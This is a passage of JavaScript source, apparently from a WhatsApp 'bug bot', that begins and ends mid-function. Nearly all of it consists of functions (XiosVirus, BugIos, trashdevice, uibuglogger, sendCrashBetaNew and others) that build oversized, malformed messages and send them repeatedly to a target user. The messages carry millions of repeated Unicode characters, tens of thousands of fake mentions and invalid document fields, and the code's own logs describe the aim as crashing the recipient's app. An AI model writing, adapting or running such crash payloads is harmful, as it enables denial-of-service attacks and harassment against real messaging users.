      mentionedJid: ['0@s.whatsapp.net'],
    },
  },
},
body: { text: '𝚂̸̴̸̡⃨̺̘͚̝͙̪̘͋̓̾͆̓̔͝͝𝙴̴̴̵̡⃨̼̠͉͉͙͖̠̈́̚̚͘͝͝͠𝙲̴̴̸⃨̺̺̫͕̼͎͇͙̿͊͊̔̓̀͝͝͠𝚁̸̸̴⃨̫̝̦͔͓͎͚͚̿̐͒͋̓͊̒̕͝𝙴̸̵̴⃨̼̝͓̺̙̪͚̘̝̓̓̽̓̽̽͑̕𝚃̸̵̵⃨̫͖̙̟͍̦̪͛̓̐̓͌͐̀͘͠ ཉ' + ui + jids},
  contextInfo: {
    mentionedJid: ['0@s.whatsapp.net'],
    mentions: ['0@s.whatsapp.net'],
      },
        footer: { text: '#NOSTRA' },
          nativeFlowMessage: {},
         contextInfo: {
          mentionedJid: ["0@s.whatsapp.net", ...Array.from({
           length: 30000
          }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
          forwardingScore: 1,
          isForwarded: true,
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          quotedMessage: {
           documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileLength: "9999999999999",
            pageCount: 1316134911,
            mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
            fileName: "𒁂𒁂𒁂𒁂𒁂𒁂" + "ꦾ".repeat(30000),
            fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
            directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1724474503",
            contactVcard: true,
            thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
            thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
            thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
            jpegThumbnail: "",
           },
          },
         },
groupMentions: [
{
  groupJid: "1@broadcast",
  groupSubject: virtex // Pastikan button udah didefinisikan
}
],
    isForwarded: true,
    quotedMessage: {
        interactiveResponseMessage: {
            body: {
                text: "Sent",
                format: "EXTENSIONS_7"
            },
            nativeFlowResponseMessage: {
                name: "custom_message",
                paramsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "HKC-QI-0",
"screen_0_Dropdown_1": "HK-9999",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "fa@gmail.me",
"screen_1_TextInput_4": "https://www.google.com/",
"screen_1_TextInput_5": "https://api.whatsapp.com/send?phone=+🪭&text="+"@1".repeat(90000),       
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "${"\u0003".repeat(55000)}",
"screen_0_TextInput_1": "HK-3001",
"screen_0_TextInput_2": "HK-6666",
"screen_0_TextInput_3": "HK-3004",
"screen_4_TextInput_8": "0x80048820",
"screen_0_TextInput_4": "HK-3005",
"screen_0_TextInput_5": "HK-3000",
"screen_0_TextInput_6": "HK-3002",
"screen_0_TextInput_7": "HK-3005",
"screen_0_TextInput_8": "HK-3006",
"screen_0_TextInput_9": "HK-3008",
"screen_0_TextInput_10": "HK-1001",
"screen_1_TextInput_0": "HK-2002",
"screen_2_TextInput_0": "HK-5005",
"screen_3_TextInput_0": "HK-3003",
"screen_5_TextInput_0": "Doomsday-2024",
"screen_0_Dropdown_2": "0.0.9_#AmpasWKWK",
"screen_0_Dropdown_3": "HK-0001",
"screen_0_Dropdown_4": "Doomsday-2024",
"screen_3_EmojiBombCrash_004": "🪭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(10000),
"flow_token": "AAAAAA_TOKEN_SECRET_CONTRA_SecretCompany_Lakuning_Mati.BANGKITKembali"
}`,
                version: 3
            }
        }
    },
  messageVersion: 1,
},
},
},
},
  Ptcp ? {
    participant: {
     jid: target
    }
   } : {}
  );
  console.log(chalk.red(""));
}
    //

    async function XiosVirus(target) {
      cella.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `  ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ -` + "࣯ꦾ".repeat(990000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝕱𝖆𝖒𝖟𝖞 𝕮𝖗𝖆𝖘𝖍 𝖀𝕴 🚫" + "ꦾ".repeat(1990000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    async function BugIos(target) {
      for (let i = 0; i < 15; i++) {
        await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
      }
      console.log(
        chalk.red.bold(
          `  ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ!`
        )
      );
    }
async function functes(target) {
      await cella.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: {
                      text: "@2348127187030@2348127187030" + "ꦾ".repeat(90000),
                    },
                    carouselMessage: {
                      cards: [
                        {
                          header: {
                            hasMediaAttachment: true,
                            ...(await prepareWAMessageMedia(
                              {
                                image: {
                                  url: "https://i.ibb.co/zMF1XL6/lordkerm.jpg",
                                },
                              },
                              {
                                upload: cella.waUploadToServer,
                              }
                            )),
                          },
                          body: {
                            text: "@2348146895993" + "ꦾ".repeat(90000),
                          },
                          nativeFlowMessage: {
                            buttons: [
                              {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "@2348146895993",
                                  url: "https://t.me/famzzy_lee",
                                  merchant_url: "https://t.me/famzzy_lee",
                                }),
                              },
                              {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                  title: "@2348146895993",
                                  sections: [
                                    {
                                      title: "@2348146895993",
                                      rows: [],
                                    },
                                  ],
                                }),
                              },
                              {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "@2348146895993",
                                  title: "𝕱𝖆𝖒𝖟𝖞𝖃𝖙𝖗𝖊𝖒𝖊!",
                                  id: ".crasher",
                                }),
                              },
                            ],
                          },
                        },
                      ],
                      messageVersion: 1,
                    },
                  },
                },
              },
            },
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
      console.log(chalk.red("FamzyL: SendBug Crash Ui"));
    }
    
    
    
    
     
 async function trashdevice(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `𝕱𝖆𝖒𝖟𝖞 𝕮𝖗𝖆𝖘𝖍☠️`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "⚠️EROR UI CRASH⚠️" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "FAMZYLEE" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    cella.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}



async function uibuglogger(target) {
    await cella.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'c',
                        degreesLongitude: 'c',
                        caption: '⚠️EROR DEVICE⚠️' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        contextInfo: {
                            forwardingScore: 127,
                            isForwarded: true,
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            },
                            groupMentions: [{
                                groupJid: "1@newsletter",
                                groupSubject: "Famzy"
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
    await console.clear()
    console.log("\x1b[33m%s\x1b[0m", `Successfully Sent Bug WhatsApp Ui System`);
}
async function invis(target, Ptcp = true) {
  let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
          text: "FamzyLee" + "ꦾ".repeat(90000),
          subtitle: "FamzyLee" + "ꦾ".repeat(90000),
          title: "Fawaz",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 999.03499999999999,
            },
            hasMediaAttachment: true
          },
          body: {
            text: "FamzyLee" + "ꦾ".repeat(90000),
          },
          footer: {
          text: "FamzyLee" + "ꦾ".repeat(90000),
          },
          nativeFlowMessage: {
            name: "call_permission_request",
            messageParamsJson: " 𝐅𝐚𝐦𝐳𝐲𝐋𝐞𝐞"
          },
          carouselMessage: {}
        },
        buttons: [
          {
            buttonId: "tes1", // Corrected typo
            buttonText: {
              displayText: "Tes1"
            }
          },
          {
            buttonId: "tes2", // Corrected typo
            buttonText: {
              displayText: "Tes2"
            }
          }
        ],
        viewOnce: true,
        headerType: 6,
      }
    }
  }), {
    userJid: target,
    quoted: null
  });

  await cella.relayMessage(target, etc.message, Ptcp ? {
    participant: {
      jid: target
    }
  } : {});
  console.log(chalk.red("FamzyL : SendBug"));
}
async function sendCrashBetaNew(target, quoted = true) {
  const spamText = "‏\n".repeat(122001);
  const crashText = "ꦽ".repeat(1900);
  await cella.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "₦ӾⱠ ⱤɆVØⱠɄ₮łØ₦",
                fileEncSha256:
                  "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath:
                  "/text/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: "",
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "𝐅𝐚𝐦𝐳𝐲𝐋𝐞𝐞" + crashText + spamText,
            },
            contextInfo: {
              mentionedJid: ["2348146895993@s.whatsapp.net"],
              mentions: ["2348146895993@s.whatsapp.net"],
            },
            footer: {
              text: "",
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: [
                "2348127187030@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 11000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 500000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "2348127187030@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256:
                    "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐅𝐚𝐦𝐳𝐲𝐋𝐞𝐞",
                  fileEncSha256:
                    "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath:
                    "/text/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath:
                    "/text/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256:
                    "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256:
                    "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
      buttons: [
        {
          buttonId: "tes1", // Corrected typo
          buttonText: {
            displayText: "Tes1"
          }
        },
        {
          buttonId: "tes2", // Corrected typo
          buttonText: {
            displayText: "Tes2"
          }
        }
      ],
      viewOnce: true,
      headerType: 6,
      quoted: null
    },
    quoted
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
  console.log(chalk.red("FamzyL : SendBug"));
}
async function CONTRA2(target, Ptcp = true) {
